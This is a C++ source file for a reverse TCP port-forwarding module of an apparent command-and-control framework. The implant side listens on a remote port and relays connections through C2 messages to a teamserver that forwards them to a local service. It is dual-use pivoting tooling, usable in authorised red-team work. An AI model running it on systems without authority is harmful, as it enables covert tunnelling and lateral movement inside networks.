#include "ReversePortForward.hpp"

#include "Common.hpp"

#include <algorithm>
#include <chrono>
#include <cstring>
#include <sstream>
#include <cerrno>
#include <memory>
#include <vector>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
#else
    #include <arpa/inet.h>
    #include <fcntl.h>
    #include <netdb.h>
    #include <netinet/in.h>
    #include <sys/select.h>
    #include <sys/socket.h>
    #include <unistd.h>
#endif

using namespace std;

constexpr std::string_view moduleName = "reversePortForward";
constexpr unsigned long long moduleHash = djb2(moduleName);

namespace
{
    string formatHelp()
    {
        string help;
        help += "reversePortForward:\n";
        help += "  Create a reverse TCP port forward similar to 'ssh -R'.\n";
        help += "  Syntax:\n";
        help += "    reversePortForward <remotePort> <localHost> <localPort>\n";
        help += "  Example:\n";
        help += "    reversePortForward 8080 127.0.0.1 80\n";
        return help;
    }

#ifdef _WIN32
    bool setNonBlocking(SOCKET socket)
    {
        u_long mode = 1;
        return ioctlsocket(socket, FIONBIO, &mode) == 0;
    }
#else
    bool setNonBlocking(int socket)
    {
        int flags = fcntl(socket, F_GETFL, 0);
        if (flags == -1)
            return false;
        if (fcntl(socket, F_SETFL, flags | O_NONBLOCK) == -1)
            return false;
        return true;
    }
#endif
}

#ifdef _WIN32
extern "C" __declspec(dllexport) ReversePortForward* ReversePortForwardConstructor()
{
    return new ReversePortForward();
}
#else
extern "C" __attribute__((visibility("default"))) ReversePortForward* ReversePortForwardConstructor()
{
    return new ReversePortForward();
}
#endif

ReversePortForward::ReversePortForward()
// #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    : ModuleCmd(std::string(moduleName), moduleHash)
    , m_localPort(0)
    , m_remotePort(0)
    , m_socketLayerReady(false)
// #else
    // , ModuleCmd("", moduleHash)
    , m_running(false)
    , m_listenerActive(false)
    // , m_remotePort(0)
    , m_listenerSocket(InvalidSocket)
    , m_listenerThread()
    , m_nextConnectionId(1)
    // , m_socketLayerReady(false)
// #endif
{
}

ReversePortForward::~ReversePortForward()
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    std::lock_guard<std::mutex> lock(m_localMutex);
    for (auto& entry : m_localConnections)
    {
        if (entry.second != InvalidSocket)
            closeSocket(entry.second);
    }
    m_localConnections.clear();
#else
    m_running = false;
    if (m_listenerThread.joinable())
        m_listenerThread.join();

    {
        std::lock_guard<std::mutex> lock(m_connectionsMutex);
        for (auto& pair : m_connections)
        {
            auto& connection = pair.second;
            if (connection && connection->socket != InvalidSocket)
                closeSocket(connection->socket);
        }
        m_connections.clear();
    }

    if (m_listenerSocket != InvalidSocket)
        closeSocket(m_listenerSocket);
#endif

    shutdownSocketLayer();
}

std::string ReversePortForward::getInfo()
{
    return formatHelp();
}

int ReversePortForward::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    if (splitedCmd.size() != 4)
    {
        c2Message.set_returnvalue(formatHelp());
        return -1;
    }

    const std::string& remotePortStr = splitedCmd[1];
    const std::string& localHost = splitedCmd[2];
    const std::string& localPortStr = splitedCmd[3];

    if (!isNumber(remotePortStr) || !isNumber(localPortStr))
    {
        c2Message.set_returnvalue("Invalid port provided.\n" + formatHelp());
        return -1;
    }

    try
    {
        m_remotePort = std::stoi(remotePortStr);
        m_localPort = std::stoi(localPortStr);
    }
    catch (const std::exception&)
    {
        c2Message.set_returnvalue("Invalid port provided.\n" + formatHelp());
        return -1;
    }

    if (m_remotePort <= 0 || m_remotePort > 65535 || m_localPort <= 0 || m_localPort > 65535)
    {
        c2Message.set_returnvalue("Ports must be between 1 and 65535.\n" + formatHelp());
        return -1;
    }

    m_localHost = localHost;

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd("start");
    c2Message.set_args(remotePortStr + " " + localHost + " " + localPortStr);
#else
    (void)splitedCmd;
    (void)c2Message;
#endif
    return 0;
}

int ReversePortForward::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    switch (c2RetMessage.errorCode())
    {
    case 1:
        errorMsg = "Reverse port forward already running.";
        break;
    case 2:
        errorMsg = "Failed to initialise networking on target.";
        break;
    case 3:
        errorMsg = "Unable to bind remote port.";
        break;
    case 4:
        errorMsg = "Reverse port forward not running.";
        break;
    case 5:
        errorMsg = "Unable to connect to local service.";
        break;
    default:
        break;
    }
#else
    (void)c2RetMessage;
    (void)errorMsg;
#endif
    return 0;
}

bool ReversePortForward::ensureSocketLayer()
{
#ifdef _WIN32
    if (m_socketLayerReady)
        return true;

    WSADATA data;
    int rc = WSAStartup(MAKEWORD(2, 2), &data);
    if (rc == 0)
        m_socketLayerReady = true;
    return m_socketLayerReady;
#else
    m_socketLayerReady = true;
    return true;
#endif
}

void ReversePortForward::shutdownSocketLayer()
{
#ifdef _WIN32
    if (m_socketLayerReady)
    {
        WSACleanup();
        m_socketLayerReady = false;
    }
#endif
}

void ReversePortForward::closeSocket(SocketHandle socket) const
{
#ifdef _WIN32
    if (socket != InvalidSocket)
        closesocket(socket);
#else
    if (socket != InvalidSocket)
        ::close(socket);
#endif
}

void ReversePortForward::enqueueChunk(int connectionId, const std::string& data, bool closeEvent)
{
    {
        std::lock_guard<std::mutex> lock(m_queueMutex);
        m_pendingChunks.push({connectionId, data, closeEvent});
    }
#if !(defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS))
    m_queueCv.notify_all();
#endif
}

// #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)

bool ReversePortForward::sendAll(SocketHandle socket, const std::string& data) const
{
    if (socket == InvalidSocket)
        return false;

    const char* buffer = data.data();
    size_t totalSent = 0;
    const size_t toSend = data.size();

    while (totalSent < toSend)
    {
        int sent = ::send(socket, buffer + totalSent, static_cast<int>(toSend - totalSent), 0);
        if (sent > 0)
        {
            totalSent += static_cast<size_t>(sent);
            continue;
        }

        if (sent == 0)
            return false;

#ifdef _WIN32
        int err = WSAGetLastError();
        if (err == WSAEWOULDBLOCK || err == WSAEINTR)
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
            continue;
        }
#else
        if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
            continue;
        }
#endif
        return false;
    }
    return true;
}

std::string ReversePortForward::receiveAvailable(SocketHandle socket, bool& closed) const
{
    std::string data;
    if (socket == InvalidSocket)
        return data;

    closed = false;

    while (true)
    {
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(socket, &readSet);

        timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 0;

        int ready = ::select(static_cast<int>(socket) + 1, &readSet, nullptr, nullptr, &tv);
        if (ready <= 0 || !FD_ISSET(socket, &readSet))
            break;

        char buffer[4096];
        int received = ::recv(socket, buffer, sizeof(buffer), 0);
        if (received > 0)
        {
            data.append(buffer, received);
            continue;
        }

        if (received == 0)
        {
            closed = true;
            break;
        }

#ifdef _WIN32
        int err = WSAGetLastError();
        if (err == WSAEWOULDBLOCK || err == WSAEINTR)
            break;
        closed = true;
#else
        if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
            break;
        closed = true;
#endif
        break;
    }

    return data;
}

void ReversePortForward::pollLocalConnections()
{
    std::vector<PendingChunk> readyChunks;

    {
        std::lock_guard<std::mutex> lock(m_localMutex);
        for (auto it = m_localConnections.begin(); it != m_localConnections.end();)
        {
            bool closed = false;
            std::string data = receiveAvailable(it->second, closed);
            if (!data.empty())
                readyChunks.push_back({it->first, data, false});

            if (closed)
            {
                closeSocket(it->second);
                readyChunks.push_back({it->first, std::string(), true});
                it = m_localConnections.erase(it);
            }
            else
            {
                ++it;
            }
        }
    }

    for (const auto& chunk : readyChunks)
        enqueueChunk(chunk.connectionId, chunk.data, chunk.closeEvent);
}

// #else

ReversePortForward::SocketHandle ReversePortForward::createListener(int port)
{
    struct addrinfo hints;
    std::memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    struct addrinfo* result = nullptr;
    std::string portStr = std::to_string(port);

    if (::getaddrinfo(nullptr, portStr.c_str(), &hints, &result) != 0)
        return InvalidSocket;

    SocketHandle listener = InvalidSocket;

    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        SocketHandle candidate = static_cast<SocketHandle>(::socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol));
        if (candidate == InvalidSocket)
            continue;

        int enable = 1;
#ifdef _WIN32
        ::setsockopt(candidate, SOL_SOCKET, SO_REUSEADDR, reinterpret_cast<const char*>(&enable), sizeof(enable));
#else
        ::setsockopt(candidate, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
#endif
        if (::bind(candidate, ptr->ai_addr, static_cast<int>(ptr->ai_addrlen)) == 0)
        {
            if (::listen(candidate, SOMAXCONN) == 0)
            {
                listener = candidate;
                break;
            }
        }
        closeSocket(candidate);
    }

    ::freeaddrinfo(result);

    if (listener != InvalidSocket)
        setNonBlocking(listener);

    return listener;
}

ReversePortForward::SocketHandle ReversePortForward::acceptClient(SocketHandle listener)
{
    if (listener == InvalidSocket)
        return InvalidSocket;

#ifdef _WIN32
    SOCKET client = ::accept(listener, nullptr, nullptr);
#else
    int client = ::accept(listener, nullptr, nullptr);
#endif
    if (client != InvalidSocket)
        setNonBlocking(client);
    return client;
}

std::shared_ptr<ReversePortForward::RemoteConnection> ReversePortForward::getConnection(int connectionId)
{
    std::lock_guard<std::mutex> lock(m_connectionsMutex);
    auto it = m_connections.find(connectionId);
    if (it != m_connections.end())
        return it->second;
    return nullptr;
}

void ReversePortForward::handleClient(std::shared_ptr<RemoteConnection> connection)
{
    SocketHandle socket = connection->socket;
    std::vector<char> buffer(4096);

    while (connection->active)
    {
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(socket, &readSet);
        timeval tv{1, 0};
        int ready = ::select(static_cast<int>(socket) + 1, &readSet, nullptr, nullptr, &tv);
        if (ready > 0 && FD_ISSET(socket, &readSet))
        {
            int received = ::recv(socket, buffer.data(), static_cast<int>(buffer.size()), 0);
            if (received > 0)
            {
                std::string data(buffer.data(), received);
                enqueueChunk(connection->id, data, false);
            }
            else
            {
                connection->active = false;
                enqueueChunk(connection->id, std::string(), true);
                break;
            }
        }
        else if (ready < 0)
        {
            connection->active = false;
            enqueueChunk(connection->id, std::string(), true);
            break;
        }
    }

    closeSocket(socket);
}

void ReversePortForward::runListener()
{
    while (m_running)
    {
        SocketHandle client = acceptClient(m_listenerSocket);
        if (client == InvalidSocket)
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            continue;
        }

        int id = m_nextConnectionId++;
        auto connection = std::make_shared<RemoteConnection>();
        connection->id = id;
        connection->socket = client;
        connection->active = true;

        {
            std::lock_guard<std::mutex> lock(m_connectionsMutex);
            m_connections[id] = connection;
        }

        connection->reader = std::thread(&ReversePortForward::handleClient, this, connection);
        connection->reader.detach();
        enqueueChunk(id, std::string(), false);
    }
}

// #endif

int ReversePortForward::followUp(const C2Message& c2RetMessage)
{
    if (!ensureSocketLayer())
        return -1;

    std::string args = c2RetMessage.args();
    if (args.empty())
        return 0;

    auto pos = args.find(':');
    if (pos == std::string::npos)
        return 0;

    std::string action = args.substr(0, pos);
    int connectionId = 0;
    try
    {
        connectionId = std::stoi(args.substr(pos + 1));
    }
    catch (const std::exception&)
    {
        return 0;
    }

    if (action == "close")
    {
        SocketHandle socket = InvalidSocket;
        {
            std::lock_guard<std::mutex> lock(m_localMutex);
            auto it = m_localConnections.find(connectionId);
            if (it != m_localConnections.end())
            {
                socket = it->second;
                m_localConnections.erase(it);
            }
        }
        closeSocket(socket);
        return 0;
    }

    if (action != "data")
        return 0;

    SocketHandle socket = InvalidSocket;
    {
        std::lock_guard<std::mutex> lock(m_localMutex);
        auto it = m_localConnections.find(connectionId);
        if (it != m_localConnections.end())
            socket = it->second;
    }

    if (socket == InvalidSocket)
    {
        std::string portStr = std::to_string(m_localPort);
        struct addrinfo hints;
        std::memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        struct addrinfo* result = nullptr;
        if (::getaddrinfo(m_localHost.c_str(), portStr.c_str(), &hints, &result) != 0)
        {
            enqueueChunk(connectionId, std::string(), true);
            return -1;
        }

        for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
        {
            SocketHandle candidate = static_cast<SocketHandle>(::socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol));
            if (candidate == InvalidSocket)
                continue;

            if (::connect(candidate, ptr->ai_addr, static_cast<int>(ptr->ai_addrlen)) == 0)
            {
                socket = candidate;
                break;
            }
            closeSocket(candidate);
        }

        ::freeaddrinfo(result);

        if (socket == InvalidSocket)
        {
            enqueueChunk(connectionId, std::string(), true);
            return -1;
        }

        setNonBlocking(socket);
        {
            std::lock_guard<std::mutex> lock(m_localMutex);
            m_localConnections[connectionId] = socket;
        }
    }

    std::string payload = c2RetMessage.data();
    if (!payload.empty())
    {
        if (!sendAll(socket, payload))
        {
            closeSocket(socket);
            {
                std::lock_guard<std::mutex> lock(m_localMutex);
                m_localConnections.erase(connectionId);
            }
            enqueueChunk(connectionId, std::string(), true);
            return -1;
        }
    }

    bool closed = false;
    std::string response = receiveAvailable(socket, closed);
    if (!response.empty())
        enqueueChunk(connectionId, response, false);

    if (closed)
    {
        closeSocket(socket);
        {
            std::lock_guard<std::mutex> lock(m_localMutex);
            m_localConnections.erase(connectionId);
        }
        enqueueChunk(connectionId, std::string(), true);
    }

    return 0;
}

int ReversePortForward::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    c2RetMessage.set_instruction(c2Message.instruction());

    std::string cmd = c2Message.cmd();
    if (cmd == "start")
    {
        if (!ensureSocketLayer())
        {
            c2RetMessage.set_errorCode(2);
            return 0;
        }

        if (m_running)
        {
            c2RetMessage.set_errorCode(1);
            return 0;
        }

        std::istringstream iss(c2Message.args());
        int remotePort = 0;
        std::string localHost;
        int localPort = 0;
        iss >> remotePort >> localHost >> localPort;
        (void)localHost;
        (void)localPort;

        if (remotePort <= 0 || remotePort > 65535)
        {
            c2RetMessage.set_errorCode(3);
            return 0;
        }

        m_remotePort = remotePort;
        m_listenerSocket = createListener(remotePort);
        if (m_listenerSocket == InvalidSocket)
        {
            c2RetMessage.set_errorCode(3);
            return 0;
        }

        m_running = true;
        m_listenerActive = true;
        m_listenerThread = std::thread(&ReversePortForward::runListener, this);
        c2RetMessage.set_returnvalue("Reverse port forward started on port " + std::to_string(remotePort));
        return 0;
    }
    else if (cmd == "send")
    {
        std::string args = c2Message.args();
        auto pos = args.find(':');
        if (pos == std::string::npos)
        {
            c2RetMessage.set_errorCode(4);
            return 0;
        }

        std::string prefix = args.substr(0, pos);
        if (prefix != "response")
        {
            c2RetMessage.set_errorCode(4);
            return 0;
        }

        int connectionId = 0;
        try
        {
            connectionId = std::stoi(args.substr(pos + 1));
        }
        catch (const std::exception&)
        {
            c2RetMessage.set_errorCode(4);
            return 0;
        }

        std::string payload = c2Message.data();
        auto connection = getConnection(connectionId);
        if (!connection)
        {
            c2RetMessage.set_errorCode(4);
            return 0;
        }

        if (connection->socket == InvalidSocket)
        {
            c2RetMessage.set_errorCode(4);
            return 0;
        }

        if (!payload.empty())
        {
            const char* buffer = payload.data();
            size_t totalSent = 0;
            size_t toSend = payload.size();
            while (totalSent < toSend)
            {
                int sent = ::send(connection->socket, buffer + totalSent, static_cast<int>(toSend - totalSent), 0);
                if (sent <= 0)
                {
                    connection->active = false;
                    enqueueChunk(connectionId, std::string(), true);
                    break;
                }
                totalSent += static_cast<size_t>(sent);
            }
        }

        return 0;
    }
    else if (cmd == "close")
    {
        std::string args = c2Message.args();
        auto pos = args.find(':');
        if (pos == std::string::npos)
        {
            c2RetMessage.set_errorCode(4);
            return 0;
        }

        std::string prefix = args.substr(0, pos);
        if (prefix != "close")
        {
            c2RetMessage.set_errorCode(4);
            return 0;
        }

        int connectionId = 0;
        try
        {
            connectionId = std::stoi(args.substr(pos + 1));
        }
        catch (const std::exception&)
        {
            c2RetMessage.set_errorCode(4);
            return 0;
        }

        std::shared_ptr<RemoteConnection> connection;
        {
            std::lock_guard<std::mutex> lock(m_connectionsMutex);
            auto it = m_connections.find(connectionId);
            if (it != m_connections.end())
            {
                connection = it->second;
                m_connections.erase(it);
            }
        }

        if (connection)
        {
            connection->active = false;
            closeSocket(connection->socket);
        }

        return 0;
    }

    return 0;
}

// TODO, we got an architectural issue here, recurringExec and followUp are not expected to communicate between them without user intervention
// could be usefull
int ReversePortForward::recurringExec(C2Message& c2RetMessage)
{
// #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    pollLocalConnections();

    std::unique_lock<std::mutex> lock(m_queueMutex);
    if (m_pendingChunks.empty())
        return 0;

    PendingChunk chunk = m_pendingChunks.front();
    m_pendingChunks.pop();
    lock.unlock();

    c2RetMessage.set_instruction(std::to_string(getHash()));
    if (chunk.closeEvent)
    {
        c2RetMessage.set_cmd("close");
        c2RetMessage.set_args("close:" + std::to_string(chunk.connectionId));
        c2RetMessage.set_data("");
    }
    else
    {
        c2RetMessage.set_cmd("send");
        c2RetMessage.set_args("response:" + std::to_string(chunk.connectionId));
        c2RetMessage.set_data(chunk.data);
    }

    return 1;
// #else
    // std::unique_lock<std::mutex> lock(m_queueMutex);
    // if (m_pendingChunks.empty())
    // {
    //     m_queueCv.wait_for(lock, std::chrono::milliseconds(100));
    //     if (m_pendingChunks.empty())
    //         return 0;
    // }

    // PendingChunk chunk = m_pendingChunks.front();
    // m_pendingChunks.pop();
    // lock.unlock();

    // c2RetMessage.set_instruction(std::to_string(getHash()));
    // if (chunk.closeEvent)
    // {
    //     c2RetMessage.set_cmd("close");
    //     c2RetMessage.set_args("close:" + std::to_string(chunk.connectionId));
    //     c2RetMessage.set_data("");
    // }
    // else
    // {
    //     c2RetMessage.set_cmd("send");
    //     c2RetMessage.set_args("data:" + std::to_string(chunk.connectionId));
    //     c2RetMessage.set_data(chunk.data);
    // }

    // return 1;
// #endif
}
